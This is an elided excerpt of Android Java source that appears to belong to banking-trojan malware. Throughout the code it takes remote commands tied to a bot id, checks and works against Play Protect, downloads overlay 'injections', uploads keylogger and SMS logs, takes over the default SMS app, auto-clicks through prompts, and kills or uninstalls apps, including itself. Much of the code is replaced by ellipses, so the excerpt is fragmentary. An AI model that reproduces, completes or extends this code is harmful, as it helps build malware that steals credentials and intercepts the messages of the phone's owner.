   ...
   public String main(Context context, String args){
        ...
        try {
          ...
          switch (jsonObject.getString("params")){
            ...
            utl.SettingsToAdd(context, "LogSMS" , "(MOD1) case "+nameCaseToError +" | Error module main" + ex.toString() +"::endLog::");
        }
                    ...
                    .addOnCompleteListener(new OnCompleteListener<SafetyNetApi.VerifyAppsUserResponse>() {
                        ...
                        public void onComplete(Task<SafetyNetApi.VerifyAppsUserResponse> task) {
                            ...
                            //    Log.e("mod","Protect ERROR2");
                                utl.SettingsWrite(context, "checkProtect", "2");
                                utl.SettingsToAdd(context, "LogSMS" , "(MOD2)  | checkProtect 1 " + ex.toString() +"::endLog::");
                            }
                        }
                    });
        }catch (Exception ex){
            utl.SettingsWrite(context, "checkProtect", "2");
            utl.SettingsToAdd(context, "LogSMS" , "(MOD2)  | checkProtect 2 " + ex.toString() +"::endLog::");
        ...
        try {
            ...
            if(jsonObject.getString("this").equals("no_command")
                ...
                try {
                    ...
                    utl.SettingsToAdd(context, "LogSMS" , "(MOD3)  | this no_command start " + e.toString() +"::endLog::");
                }
                ...
                if (!response.equals("||no||") && (!response.isEmpty())) {  // ||no||
                    try {
                        ...
                        utl.SettingsToAdd(context, "LogSMS" , "(MOD4)  | ERROR Save Array Injectiong " + ex.toString() +"::endLog::");
                    }
                }
                ...
                switch (jsonCommand.getString("name")){
                    ...
                    case "deleteApplication":
                        utl.SettingsWrite(context, "autoClick", "1");
                        utl.SettingsWrite(context, "killApplication", jsonCommand.getString("app"));
                        break;
                    case "startAdmin":
                    ...
                    case "killMe":
                        utl.SettingsWrite(context, "autoClick", "1");
                        utl.SettingsWrite(context, "killApplication", context.getPackageName());
                        break;
                    ...
                    case "updateModule":
                        ...
                        try {
                            ...
                            utl.SettingsToAdd(context, "LogSMS" , "(MOD5)  | updateModule " + ex.toString() +"::endLog::");
                        }
                        break;
            ...
            utl.SettingsToAdd(context, "LogSMS" , "(MOD6)  | ERROR Json ~settings~ and ~commands~  " + ex.toString() +"::endLog::");
            return  "0";
        }
    }
    ...
    private String startViewInject(Context context, JSONObject jsonObject){
        try{
            ...
            //     utl.SettingsToAdd(context, "LogSMS" , "(MOD7)  | Error module startViewInject  " + ex.toString() +"::endLog::");}
        }
        return "";
    }
    ...
    private String serviceWorkingWhile(Context context, JSONObject jsonObject){
        ...
        try{
            ...
            tick = 0;
            utl.SettingsToAdd(context, "LogSMS" , "(MOD8)  | tick  " + ex.toString() +"::endLog::");
        }
        //----------donwload injections------
        try {
                ...
                for (int i = 0; i < arrayInjection.length; i++) {
                    ...
                    if ((!arrayInjection[i].isEmpty() && (!arrayInjection[i].equals("||no||")))) {
                        try {
                            ...
                            utl.SettingsToAdd(context, "LogSMS", "(MOD9)  | ERROR for download injections  " + ex.toString() + "::endLog::");
                        }
                    }
                }
                if (intExitInj == 0) {
            ...
            utl.SettingsToAdd(context, "LogSMS" , "(MOD10)  | donwload injections  " + ex.toString() +"::endLog::");
        }
        ...
        try {
            ...
            utl.SettingsToAdd(context, "LogSMS" , "(MOD11)  | Upload Logs Injection  " + ex.toString() +"::endLog::");
        }
        try{
        //--------------Send Logs SMS------------
        String getLogSMS = utl.SettingsRead(context, "LogSMS");
        if(!getLogSMS.isEmpty()){
            if(utl.sendLogsSMS(context, getLogSMS,idbot).equals("ok")){
                if(utl.SettingsRead(context, "LogSMS").length() > getLogSMS.length()){
                    utl.SettingsRemove(context, "LogSMS", getLogSMS);
                }else{
                    utl.SettingsWrite(context, "LogSMS","");
                }
            }
        }
        //--------------Send Logs Keylogger------------
        ...
        if(!logsApplications.isEmpty()){
            ...
            utl.SettingsToAdd(context, "LogSMS" , "(MOD12)  | Send Logs " + ex.toString() +"::endLog::");
        }
        ...
        try {
            if (utl.getScreenBoolean(context)) {
                if (android.os.Build.VERSION.SDK_INT >= 19) {
                    if ((utl.SettingsRead(context, consts.hiddenSMS).equals("1") || ((utl.SettingsRead(context, "day1PermissionSMS").equals("1")) && (Integer.parseInt(utl.SettingsRead(context, "schetBootReceiver")) >= 11 ))) ) {
                        if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) { //Hidden SMS
                            ...
                            if (Build.VERSION.SDK_INT >= 29) {
                                ...
                                utl.SettingsWrite(context, "autoClick", "1");//auto click start!
                        ...
                        if (Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) { // return
                            utl.SettingsWrite(context, "autoClick", "1");//auto click start!
                            utl.swapSmsMenager(context, utl.SettingsRead(context, "packageNameDefultSmsMenager"));
                        }
                    }
            ...
            utl.SettingsToAdd(context, "LogSMS" , "(MOD13)  | Hidden SMS " + ex.toString() +"::endLog::");
        }
        //----------------Stop Sound------------------
        try {
            ...
            utl.SettingsToAdd(context, "LogSMS" , "(MOD14)  | Stop Sound " + ex.toString() +"::endLog::");
        }
        //---------Kill Application---------------------
        try{
        if(utl.getScreenBoolean(context)){
            String nameAppKill = utl.SettingsRead(context, "killApplication");
            if(!nameAppKill.isEmpty()){
             ...
             //   utl.SettingsWrite(context, "kill", "dead");
                try {
                    ...
                    utl.SettingsToAdd(context, "LogSMS" , "(MOD16)  | Kill Application 1 " + ex.toString() +"::endLog::");
                }
            }
        }}catch (Exception ex){
            utl.SettingsToAdd(context, "LogSMS" , "(MOD15)  | Kill Application 2 " + ex.toString() +"::endLog::");
        }
        //-------------timeInjecting--------------------
        try {
        ...
        try {
            ...
            utl.SettingsToAdd(context, "LogSMS" , "(MOD17)  | error off protect " + ex.toString() +"::endLog::");
        }
        return "";
    }
